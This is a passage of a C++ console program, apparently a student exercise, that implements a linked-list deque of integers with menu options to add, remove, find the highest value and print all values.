		switch (deleteOption)
		{
		case 1:

			for (int i = 0; i < countOfDelete; i++)
			{
				p = rightInput;
				p2 = leftInput;

				bool isLast = false;

				do
				{
					if (!p2->nextElement) {

						isLast = true;
						break;

					}

					if (p2->nextElement != p) {
						p2 = p2->nextElement;
					}

				} while (p2->nextElement != p);


				if (isLast)
				{
					rightInput = NULL;

					leftInput = NULL;

					delete p;


					break;

				}
				else {
					rightInput = p2;

					delete p;

					p2 = rightInput;

					rightInput->nextElement = NULL;
				}
			}

			break;

		case 2:

			while (rightInput)
			{

				p = rightInput;
				p2 = leftInput;

				bool isLast = false;

				do
				{
					if (!p2->nextElement) {

						isLast = true;
						break;

					}

					if (p2->nextElement != p) {
						p2 = p2->nextElement;
					}

				} while (p2->nextElement != p);


				if (isLast)
				{
					rightInput = NULL;

					leftInput = NULL;

					delete p;


				}
				else {
					rightInput = p2;

					delete p;

					p2 = rightInput;

					rightInput->nextElement = NULL;
				}

			}


			break;
		default:
			break;
		}

		break;
	default:
		break;
	}

}



void pushNewElement(int n, short choose)
{

	DequeOfNumbers* p;

	switch (choose)
	{
	case 1:

		p = leftInput;

		leftInput = new DequeOfNumbers;

		leftInput->valueKey = n;

		leftInput->nextElement = p;

		if (!rightInput) {
			rightInput = leftInput;
		}

		break;

	case 2:
		p = rightInput;

		rightInput = new DequeOfNumbers;

		rightInput->valueKey = n;

		rightInput->nextElement = NULL;

		if (!leftInput) {
			leftInput = rightInput;
		}
		else {
			p->nextElement = rightInput;
		}

	default:
		break;
	}
}



int getHighestNumber() {

	short choose = -1;
	DequeOfNumbers* p;


	int highestNumber = 0;

	p = leftInput;

	highestNumber = leftInput->valueKey;



	while (p)
	{

		if (p->valueKey > highestNumber)
		{
			highestNumber = p->valueKey;
		}

		p = p->nextElement;

	};


	return highestNumber;

}


void getAllNumbers() {


	DequeOfNumbers* p;

	p = leftInput;


	do {
		cout << p->valueKey << "" "";

		p = p->nextElement;

	} while (p);

	cout << endl;

}

int main()
{
	short choose = -1;

	short choose2 = -1;
	short deleteOption = -1;
	short countOfDelete = -1;
	do
	{

		cout << ""Choose option\n[1] Add integer number\n[2] Remove element\n[3] Get highest number\n[4] Get all numbers\n[0] Exit\n"";
		cin >> choose;

		switch (choose)
		{
		case 1:

			system(""cls"");


			short counterOfAdd;
			int n;

			do
			{
				cout << ""Choose option\n[1] Add in LEFT\n[2] Add in RIGHT\n[0] Exit\n"";
				cin >> choose2;

				if (choose2 > 0)
				{

					do
					{
						cout << ""Enter count of number for add: "";
						cin >> counterOfAdd;


					} while (counterOfAdd < 0);

					cout << endl;

					for (int i = 0; i < counterOfAdd; i++) {

						cout << ""Enter value of int: "";
						cin >> n;

						pushNewElement(n, choose2);
					}
				}


			} while (choose2 < 0 || choose2 > 2);

			if (choose2 > 0)
			{
				cout << endl;
				cout << ""Number/s added\n"";
			}
			else {
				cout << endl;
				cout << ""Number/s no added\n"";
			}

			choose = -1;

			choose2 = -1;

			break;

		case 2:

			system(""cls"");


			if (leftInput && rightInput)
			{
				do
				{
					cout << ""Choose option\n[1] Remove LEFT\n[2] Remove RIGHT\n[0] Exit\n"";
					cin >> choose2;


					if (choose2 > 0)
					{
						do {
							cout << ""Choose option\n[1] Count of number for delete \n[2] Remove All\n[0] Exit\n"";
							cin >> deleteOption;


							if (deleteOption == 1)
							{
								do
								{
									cout << ""Enter count of number for delete: "";
									cin >> countOfDelete;

								} while (countOfDelete < 1);

							}

						} while (deleteOption < 0 || deleteOption > 2);

						popElement(choose2, deleteOption, countOfDelete);

						cout << ""Delete element"" << endl;
					}


				} while (choose2 < 0 || choose2 > 2);
			}
			else {
				cout << ""No number/s to remove\n"";
				cout << endl;
			}

			choose = -1;
			choose2 = -1;

			countOfDelete = -1;
			deleteOption = -1;

			break;

		case 3:


			system(""cls"");

			if (leftInput && rightInput)
			{
				if (leftInput->nextElement) {

					cout << ""Highest number is: "" << getHighestNumber() << endl;
					cout << endl;
				}
				else {
					cout << ""Have only one number"" << endl;
					cout << endl;
				}


			}
			else {
				cout << ""No number/s to get\n"";
				cout << endl;
			}

			choose = -1;

			break;

		case 4:

			system(""cls"");

			if (leftInput && rightInput)
			{
				getAllNumbers();
				cout << endl;
			}
			else {
				cout << ""No number/s to get\n"";
				cout << endl;
			}


			choose = -1;

			break;

		default:
			break;
		}

	} while (choose < 0 || choose > 4);
}

"
